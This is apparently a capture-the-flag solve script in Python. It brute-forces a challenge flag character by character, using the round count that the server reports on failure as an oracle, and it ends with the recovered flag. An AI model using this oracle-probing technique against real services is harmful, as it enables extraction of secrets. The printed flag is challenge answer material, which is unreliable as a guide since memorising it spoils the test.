import requests
import re
import string

name = ""
candidates = []
for letter in string.printable:
    probe = name + letter + "A"
    r = requests.get("http://ctf.kaf.sh:1050/scripts/page/?" + probe)

    failure = re.findall("failed after (\d*?) rounds", r.text)

    if failure:
        rounds_failed = int(failure[0])
        if rounds_failed == 2:
            candidates.append(letter)

print candidates # ["K"]

# got lucky here, since I picked "A" as the first guess
# so KA was our candidate, otherwise, would have had
# to do letter + "B", letter + "C", etc., excluding names
# that already exist, but a reasonable first guess
# nevertheless is the flag format KAF

# let's guess that our goal is the flag

name = "KAF{"

# we start with needing 5 letters to pass,
# and failure should occur at the sixth, so
# we expect "failed after 5 rounds"; we increase
# this expected failure count as we find a letter
expected_probe_failure_rounds = 5

while True:
    for letter in string.printable:
        # assume we won't see '{', can watch progress and adjust if needed
        probe = name + letter + "{"
        r = requests.get("http://ctf.kaf.sh:1050/scripts/page/?" + probe)

        failure = re.findall("failed after (\d*?) rounds", r.text)

        if failure:
            rounds_failed = int(failure[0])
            if rounds_failed == expected_probe_failure_rounds:
                name += letter
                expected_probe_failure_rounds += 1
                break
        else:
            print(name)
            exit() # success, probably got status OK
    print(name)

# KAF{12098421009713091723097120397428479354+ju5t+m3551n9+w1th+ya+b0ii}